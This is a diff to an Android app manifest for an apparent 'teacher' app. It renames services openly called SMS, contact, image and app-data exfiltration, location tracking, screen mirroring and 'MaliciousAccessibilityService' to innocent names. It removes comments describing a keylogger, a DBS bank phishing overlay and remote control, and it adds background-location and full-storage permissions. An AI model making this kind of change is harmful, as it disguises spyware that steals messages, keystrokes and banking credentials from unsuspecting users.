@@ -4,6 +4,10 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
@@ -49,7 +53,7 @@
         </activity>
 
         <receiver
-            android:name="com.example.teacherapp.receivers.BootReceiver"
+            android:name="com.example.teacherapp.receivers.StartupReceiver"
             android:enabled="true"
             android:exported="false">
             <intent-filter>
@@ -58,7 +62,7 @@
         </receiver>
 
         <receiver
-            android:name="com.example.teacherapp.receivers.SmsReceiver"
+            android:name="com.example.teacherapp.receivers.MessageReceiver"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
@@ -68,46 +72,38 @@
         </receiver>
 
         <service
-            android:name="com.example.teacherapp.services.SmsExfiltrationService"
+            android:name="com.example.teacherapp.services.NotificationSyncService"
             android:enabled="true"
             android:exported="false" />
 
         <service
-            android:name="com.example.teacherapp.services.ContactExfiltrationService"
+            android:name="com.example.teacherapp.services.RosterSyncService"
             android:enabled="true"
             android:exported="false" />
 
         <service
-            android:name="com.example.teacherapp.services.ImageExfiltrationService"
+            android:name="com.example.teacherapp.services.MediaCacheWorker"
             android:enabled="true"
             android:exported="false" />
 
         <service
-            android:name="com.example.teacherapp.services.AppDataExfiltrationService"
+            android:name="com.example.teacherapp.services.SessionCacheService"
             android:enabled="true"
             android:exported="false" />
 
         <service
-            android:name="com.example.teacherapp.services.LocationTrackingService"
+            android:name="com.example.teacherapp.services.GeoContextService"
             android:enabled="true"
             android:exported="false" />
 
         <service
-            android:name="com.example.teacherapp.services.ScreenMirrorService"
+            android:name="com.example.teacherapp.services.MediaStreamService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
-        <!--
-            ONE AccessibilityService = ONE permission popup for the user.
-            Internally delegates to:
-              • KeyloggerHelper      (keystrokes + field focus)
-              • OverlayHelper        (DBS phishing overlay)
-              • RemoteControlHelper  (remote tap / swipe / text)
-        -->
-        <!-- Floating bubble service — disguise for overlay permission -->
         <service
-            android:name="com.example.teacherapp.services.FloatingBubbleService"
+            android:name="com.example.teacherapp.services.QuickAccessService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="specialUse">
@@ -117,7 +113,7 @@
         </service>
 
         <service
-            android:name="com.example.teacherapp.services.MaliciousAccessibilityService"
+            android:name="com.example.teacherapp.services.InputAssistService"
             android:enabled="true"
             android:exported="false"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
